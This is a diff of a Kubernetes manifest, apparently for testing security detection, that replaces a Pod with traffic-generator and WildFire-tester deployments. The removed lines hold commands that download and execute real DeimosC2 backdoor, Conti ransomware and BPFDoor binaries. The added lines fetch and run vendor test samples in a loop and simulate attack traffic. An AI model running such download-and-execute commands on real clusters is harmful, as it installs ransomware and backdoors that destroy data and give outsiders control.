@@ -1,28 +1,112 @@
-apiVersion: v1
-kind: Pod
+---
+apiVersion: apps/v1
+kind: Deployment
 metadata:
-  name: busybox-script-runner
+  name: traffic-generator
   labels:
-    app: busybox-script
+    app: traffic-generator
 spec:
-  containers:
-  - name: busybox-script-container
-    image: <your-dockerhub-username>/busybox-script:latest
-    imagePullPolicy: Always
-    command: ["/tmp/busybox_sample_download_script.sh"]
-    volumeMounts:
-    - name: script-volume
-      mountPath: /tmp
-  - name: c2-agent-container
-    image: busybox
-    command: ["sh", "-c", "wget https://raw.githubusercontent.com/timb-machine/linux-malware/main/malware/binaries/Unix.Backdoor.DeimosC2/05e9fe8e9e693cb073ba82096c291145c953ca3a3f8b3974f9c66d15c1a3a11d.elf.x86_64 -O /tmp/deimosC2.elf && chmod +x /tmp/deimosC2.elf && /tmp/deimosC2.elf"]
-  - name: conti-ransomware-container
-    image: busybox
-    command: ["sh", "-c", "wget https://raw.githubusercontent.com/timb-machine/linux-malware/main/malware/binaries/Conti/bb64b27bff106d30a7b74b3589cc081c345a2b485a831d7e8c8837af3f238e1e.elf.x86_64 -O /tmp/conti.elf && chmod +x /tmp/conti.elf && /tmp/conti.elf"]
-  - name: bpfdoor-container
-    image: busybox
-    command: ["sh", "-c", "wget https://raw.githubusercontent.com/timb-machine/linux-malware/main/malware/binaries/BPFDoor/07ecb1f2d9ffbd20a46cd36cd06b022db3cc8e45b1ecab62cd11f9ca7a26ab6d.elf.x86_64 -O /tmp/bpfdoor.elf && chmod +x /tmp/bpfdoor.elf && /tmp/bpfdoor.elf"]
-  restartPolicy: Never
-  volumes:
-  - name: script-volume
-    emptyDir: {}
+  replicas: 1
+  selector:
+    matchLabels:
+      app: traffic-generator
+  template:
+    metadata:
+      labels:
+        app: traffic-generator
+    spec:
+      containers:
+      - name: traffic-generator-container
+        image: byrnedo/alpine-curl:latest # Lightweight image with curl for generating traffic
+        command: ["/bin/sh", "-c", "
+          src_ip='192.168.1.100'; 
+          dst_ip='192.168.2.200'; 
+          src_port='4444'; 
+          dst_port='8080'; 
+          for i in {1..10}; do 
+            echo 'Simulating consistent attack traffic: S.IP=${src_ip}, S.Port=${src_port}, D.IP=${dst_ip}, D.Port=${dst_port}, Protocol=tcp'; 
+            curl -s -o /dev/null --local-port ${src_port} http://${dst_ip}:${dst_port}; 
+            sleep 1;
+          done
+        "]
+        resources:
+          limits:
+            memory: "128Mi"
+            cpu: "100m"
+          requests:
+            memory: "64Mi"
+            cpu: "50m"
+      restartPolicy: Always
+      nodeSelector:
+        kubernetes.io/os: linux
+---
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: wildfire-tester
+  labels:
+    app: wildfire-tester
+spec:
+  replicas: 1
+  selector:
+    matchLabels:
+      app: wildfire-tester
+  template:
+    metadata:
+      labels:
+        app: wildfire-tester
+    spec:
+      containers:
+      - name: wildfire-test-container
+        image: byrnedo/alpine-curl:latest
+        command: ["/bin/sh", "-c", "while true; do \
+          echo '[+] Downloading WildFire test samples...'; \
+          curl -o /tmp/pe_sample https://wildfire.paloaltonetworks.com/publicapi/test/pe; \
+          curl -o /tmp/apk_sample https://wildfire.paloaltonetworks.com/publicapi/test/apk; \
+          curl -o /tmp/macosx_sample https://wildfire.paloaltonetworks.com/publicapi/test/macos; \
+          curl -o /tmp/elf_sample https://wildfire.paloaltonetworks.com/publicapi/test/elf; \
+          chmod +x /tmp/pe_sample /tmp/apk_sample /tmp/macosx_sample /tmp/elf_sample; \
+          echo '[+] Executing WildFire test samples...'; \
+          /tmp/pe_sample; /tmp/apk_sample; /tmp/macosx_sample; /tmp/elf_sample; \
+          sleep 60; \
+        done"]
+        resources:
+          limits:
+            memory: "256Mi"
+            cpu: "200m"
+          requests:
+            memory: "128Mi"
+            cpu: "100m"
+      restartPolicy: Always
+      nodeSelector:
+        kubernetes.io/os: linux
+---
+apiVersion: v1
+kind: Service
+metadata:
+  name: traffic-generator-service
+  labels:
+    app: traffic-generator
+spec:
+  type: LoadBalancer
+  selector:
+    app: traffic-generator
+  ports:
+  - protocol: TCP
+    port: 8080
+    targetPort: 8080
+---
+apiVersion: v1
+kind: Service
+metadata:
+  name: wildfire-tester-service
+  labels:
+    app: wildfire-tester
+spec:
+  type: LoadBalancer
+  selector:
+    app: wildfire-tester
+  ports:
+  - protocol: TCP
+    port: 8081
+    targetPort: 8081
